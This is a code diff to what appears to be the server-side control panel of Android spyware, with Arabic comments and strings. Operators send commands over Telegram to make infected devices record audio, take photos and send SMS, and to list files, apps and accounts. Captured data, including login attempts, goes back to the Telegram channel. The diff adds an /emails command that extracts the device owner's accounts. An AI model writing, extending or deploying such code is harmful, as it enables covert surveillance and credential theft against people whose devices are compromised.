@@ -32,7 +32,8 @@ const BASE_COMMANDS = {
   '/files': 'files:1',
   '/killapp': 'killapp:1',
   '/sysinfo': 'sysinfo:1',
-  '/photo': 'take_photo'
+  '/photo': 'take_photo',
+  '/emails': 'get_emails:1' // <--- الأمر الجديد
 };
 
 async function kvCmd(...args) {
@@ -91,12 +92,11 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
-      // التحقق من وقت انتهاء المفتاح (gentime) المحفوظ في KV
       const expAt = await kvCmd('GET', 'key_exp_at');
       if (expAt && Date.now() > parseInt(expAt)) {
         await kvCmd('DEL', 'key_exp_at');
         await kvCmd('SET', 'app_secret_key', 'EXPIRED');
-        return res.status(200).send('"killapp:1"'); // يقتل التطبيق
+        return res.status(200).send('"killapp:1"');
       }
       
       const cmd = remoteCommand;
@@ -123,7 +123,6 @@ export default async function handler(req, res) {
         await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
       }
 
-      // استقبال الصور والتسجيلات الصوتية
       if (type === 'media') {
         try {
           const parts = cleanBody.split('|');
@@ -145,7 +144,7 @@ export default async function handler(req, res) {
       }
 
       if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
-      if (type === 'applist') await sendToTelegram(`📱 *التطبيقات:*\n\n${cleanBody}`);
+      if (type === 'applist') await sendToTelegram(`📱 *التطبيقات/الحسابات:*\n\n${cleanBody}`);
       if (type === 'files') await sendToTelegram(`📁 *الملفات:*\n\n${cleanBody}`);
       
       return res.status(200).send('"success"');
@@ -163,7 +162,6 @@ export default async function handler(req, res) {
       const args = text.trim().split(/\s+/);
       const command = args[0].toLowerCase();
 
-      // أوامر التسجيل الديناميكية (rec15, rec30, rec60...)
       if (command.startsWith('/rec')) {
         const seconds = parseInt(command.replace('/rec', ''));
         if (!isNaN(seconds) && seconds > 0 && seconds <= 300) {
@@ -191,11 +189,12 @@ export default async function handler(req, res) {
           break;
         case '/help': 
           await sendToTelegram(`👑 *لوحة التحكم*\n\n` +
-            `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت)\n/photo (التقاط صورة)\n\n` +
+            `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت)\n/photo (التقاط صورة)\n/emails (جلب الحسابات)\n\n` +
             `⏱️ *المفاتيح:*\n/gentime <min>\n/settime <min>\n/setkey <key>\n/lock /unlock\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall\n\n` +
             `💥 *الأوامر المولدة:*\n/toast1-100 /url1-100 /vib1-50 /clip1-50 /sms1-50 /call1-50`); 
           break;
+        case '/emails': remoteCommand = "get_emails:1"; await sendToTelegram("📧 `[MAIL]` جاري استخراج الحسابات..."); break;
         case '/photo': remoteCommand = 'take_photo'; await sendToTelegram("📷 `[CAM]` جاري التقاط الصورة..."); break;
 
         case '/gentime':
